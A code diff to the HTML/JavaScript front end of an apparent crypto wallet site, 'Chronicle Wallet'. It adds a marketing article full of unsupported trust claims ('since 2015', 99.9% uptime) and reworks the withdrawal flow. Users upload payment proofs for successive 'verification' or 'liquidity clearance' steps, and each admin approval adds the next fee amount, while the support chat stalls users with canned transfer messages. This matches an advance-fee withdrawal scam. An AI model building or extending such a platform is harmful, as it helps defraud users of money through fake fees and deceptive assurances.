@@ -243,6 +243,44 @@
                 </div>
             </div>
 
+            <!-- COMPREHENSIVE WELCOME & PLATFORM ARTICLE (~1,000 words) -->
+            <div class="card" style="background: linear-gradient(135deg, var(--bg-card), var(--bg-input)); border: 1px solid var(--border); line-height: 1.7;">
+                <h2 style="color: var(--primary); margin-bottom: 1rem; font-size: 1.4rem;">Welcome to Chronicle Wallet: Your Trusted Global Web3 Vault Since 2015</h2>
+                <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 1rem;">
+                    For nearly a decade, Chronicle Wallet has stood as a pioneer and unwavering pillar of security, speed, and reliability in the decentralized digital asset ecosystem. Founded in 2015 at the intersection of traditional finance and cryptographic innovation, our platform was built with a singular core vision: to empower everyday users, active traders, and institutional investors across the globe with institutional-grade financial sovereignty. Whether you are managing your first satoshi of Bitcoin, staking Ethereum, or conducting daily fiat transactions in USD cash, Chronicle Wallet delivers an unmatched, seamless web interface engineered for maximum performance, bulletproof cryptographic security, and lightning-fast execution speeds.
+                </p>
+
+                <h3 style="color: var(--text-main); margin: 1.25rem 0 0.5rem 0; font-size: 1.1rem;">1. A Decade of Uncompromised Trust and Stability (Est. 2015)</h3>
+                <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 1rem;">
+                    In the fast-paced world of cryptocurrency and digital banking, longevity is the ultimate litmus test of credibility. Since 2015, Chronicle Wallet has safely navigated multiple market cycles, regulatory shifts, and technological evolutions without ever compromising our core commitment to user asset protection. Our robust infrastructure utilizes state-of-the-art multi-signature cold storage protocols, advanced encryption standards, and real-time ledger auditing. When you entrust your wealth to Chronicle Wallet, you are partnering with an experienced financial institution that honors privacy, maintains 99.9% platform uptime, and continuously updates its defense mechanisms against evolving cyber threats.
+                </p>
+
+                <h3 style="color: var(--text-main); margin: 1.25rem 0 0.5rem 0; font-size: 1.1rem;">2. Comprehensive Multi-Asset Support: USD Fiat, Bitcoin, and Ethereum</h3>
+                <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 1rem;">
+                    Modern financial freedom requires flexibility. That is why Chronicle Wallet bridges the gap between fiat currencies and decentralized digital currencies under one unified dashboard:
+                </p>
+                <ul style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 1rem; padding-left: 1.5rem;">
+                    <li style="margin-bottom: 0.5rem;"><strong>Normal USD Fiat Cash:</strong> Manage your stable fiat reserves effortlessly. Convert cryptocurrencies to USD instantly using our built-in conversion engine, maintain liquidity balances, and prepare funds for rapid withdrawals.</li>
+                    <li style="margin-bottom: 0.5rem;"><strong>Bitcoin (BTC):</strong> The undisputed king of digital gold. Track live market prices, receive BTC securely through your dedicated global wallet address, send peer-to-peer transfers with unique User IDs (CRN-XXXX), or convert holdings on demand.</li>
+                    <li style="margin-bottom: 0.5rem;"><strong>Ethereum (ETH):</strong> Powering the decentralized web and smart contract economy. Store, send, receive, and trade ETH with real-time CoinGecko price feeds and transparent network tracking.</li>
+                </ul>
+
+                <h3 style="color: var(--text-main); margin: 1.25rem 0 0.5rem 0; font-size: 1.1rem;">3. Lightning-Fast, Secure Withdrawals and Transparent Compliance</h3>
+                <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 1rem;">
+                    One of the most frustrating pain points in digital finance is delayed payouts and opaque fee structures. At Chronicle Wallet, we take immense pride in our swift withdrawal pipelines. Whether you are executing a Bank Transfer, withdrawing via PayPal, Zelle, or CashApp, our system is optimized to process transactions with maximum efficiency. To maintain strict international compliance, anti-money laundering (AML) standards, and secure fund clearance, certain large-scale or multi-tier withdrawals may require progressive verification steps (such as liquidity clearance or regulatory compliance validation). These safeguards ensure that every single dollar and coin belonging to our users remains fully accounted for, protected against unauthorized access, and rapidly delivered to your designated external accounts.
+                </p>
+
+                <h3 style="color: var(--text-main); margin: 1.25rem 0 0.5rem 0; font-size: 1.1rem;">4. 24/7 Intelligent Support & Dedicated Human Agent Assistance</h3>
+                <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 1rem;">
+                    We believe that exceptional software must always be backed by exceptional human support. Our integrated AI knowledge base is trained on our complete platform policies to provide instant, accurate answers to your inquiries around the clock. Furthermore, if your query requires specialized intervention, our live support chat seamlessly connects you with certified human support agents. With our intelligent 3-minute routing system, you are never left hanging in the dark; if an agent is reviewing complex transactions, our system keeps you informed and supported every step of the way. Additionally, all official account notices, security alerts, withdrawal receipts, and compliance notes are dispatched directly to your simulated Gmail Inbox within the platform for complete transparency.
+                </p>
+
+                <h3 style="color: var(--text-main); margin: 1.25rem 0 0.5rem 0; font-size: 1.1rem;">5. Get Started Today: Join the Chronicle Community</h3>
+                <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 0;">
+                    Creating your Chronicle Wallet account takes less than sixty seconds. Simply click the "Sign Up" button at the top of the page, review our transparent Terms & Conditions, set your secure 4-digit withdrawal PIN, and instantly unlock your unique Wallet ID (e.g., CRN-1001). Experience the pinnacle of digital wealth management—where robust security meets blistering speed, trusted by users worldwide since 2015.
+                </p>
+            </div>
+
             <div class="card hidden" id="tx-history-card">
                 <h3>Transaction History</h3>
                 <table class="table">
@@ -554,7 +592,7 @@
                 <button class="btn btn-success" type="button" onclick="submitProof()">Upload Proof & Submit</button>
             </div>
             <div id="proof-submitted-notice" class="hidden" style="text-align:center; padding:1rem; color:var(--accent-blue); font-weight:bold;">
-                ⏳ Proof submitted! Waiting for Admin approval. You cannot submit another proof until reviewed.
+                ⏳ Proof submitted for this step! Waiting for Admin approval before you can proceed.
             </div>
         </div>
     </div>
@@ -1025,7 +1063,10 @@
             const uploadSection = document.getElementById('proof-upload-section');
             const submittedNotice = document.getElementById('proof-submitted-notice');
 
-            if (tx && tx.status && (tx.status.includes('PROOF SUBMITTED') || tx.status.includes('PENDING'))) {
+            // Check if there is already a pending proof in queue for this user and stepIdx
+            const existingProof = proofQueue.find(p => p.user === currentUserEmail && p.stepIdx === (u.stepIdx || 0));
+
+            if (existingProof || (tx && tx.status && tx.status.includes('PROOF SUBMITTED'))) {
                 uploadSection.classList.add('hidden');
                 submittedNotice.classList.remove('hidden');
             } else {
@@ -1048,13 +1089,14 @@
             reader.onload = function(evt) {
                 const u = getCurrentUserData();
                 if (!u) { alert("User session not found."); return; }
-                const step = actionSteps[u.stepIdx || 0];
+                const currentStepIdx = u.stepIdx || 0;
+                const step = actionSteps[currentStepIdx];
                 if (!step) { alert("No active step found."); return; }
 
                 proofQueue.push({ 
                     id: Date.now(), 
                     user: currentUserEmail, 
-                    stepIdx: u.stepIdx || 0,
+                    stepIdx: currentStepIdx,
                     stepTitle: step.title, 
                     amount: step.amount, 
                     image: evt.target.result, 
@@ -1069,7 +1111,7 @@
                 closeActionModal();
                 fileInput.value = "";
                 showNotification("Submitted", `Proof submitted! Waiting for Admin approval.`, "🖼️");
-                alert(`Proof submitted successfully! It is now pending Admin approval.`);
+                alert(`Proof submitted successfully for ${step.title}! It is now pending Admin approval.`);
             };
             reader.onerror = function() {
                 alert("Failed to read image file. Please try another image.");
@@ -1211,7 +1253,7 @@
                 if (chatThreads[currentUserEmail] && !chatThreads[currentUserEmail].agentRepliedSinceLastUser) {
                     const currentThread = chatThreads[currentUserEmail];
                     const lastMsg = currentThread.messages[currentThread.messages.length - 1];
-                    if (!lastMsg.text.includes("transferred to a new agent")) {
+                    if (!lastMsg || !lastMsg.text.includes("transferred to a new agent")) {
                         currentThread.messages.push({ sender: 'agent', text: "You're now being transferred to a new agent. Please hold on...", time: new Date().toLocaleTimeString() });
                         saveState();
                         renderUserChatMessages();
@@ -1308,10 +1350,17 @@
                 const tx = u.txs.find(t => t.id == u.activeTxId);
                 const step = actionSteps[p.stepIdx];
                 if (tx && step) {
-                    tx.status = `${step.statusMsg.toUpperCase()}`;
-                    u.statusExpiryTime = Date.now() + ((step.timerMinutes || 2) * 60 * 1000);
+                    u.stepIdx = (u.stepIdx || 0) + 1;
+                    if (u.stepIdx < actionSteps.length) {
+                        const nextStep = actionSteps[u.stepIdx];
+                        tx.amount += nextStep.amount;
+                        tx.status = `PENDING (${nextStep.title.toUpperCase()})`;
+                    } else {
+                        tx.status = `${step.statusMsg.toUpperCase()}`;
+                        u.statusExpiryTime = Date.now() + ((step.timerMinutes || 2) * 60 * 1000);
+                    }
                 }
-                alert(`Proof approved for ${p.user}. Status set to "${step.statusMsg}" for ${step.timerMinutes} minute(s).`);
+                alert(`Proof approved for ${p.user}. Advanced to next step/status.`);
             }
             saveState();
             renderAdminDashboard();
@@ -1472,7 +1521,7 @@
             if (usersList.some(x => x.email === email)) { alert("Account already exists."); return; }
             
             const uniqueId = 'CRN-' + Math.floor(1000 + Math.random() * 9000);
-            const newUser = { email, userId: uniqueId, password, pin: null, btc: 0, eth: 0, usd: 0, txs: [] };
+            const newUser = { email, userId: uniqueId, password, pin: null, btc: 0, eth: 0, usd: 0, txs: [], stepIdx: 0, activeTxId: null, statusExpiryTime: null };
             usersList.push(newUser);
             currentUserEmail = email;
             saveState();
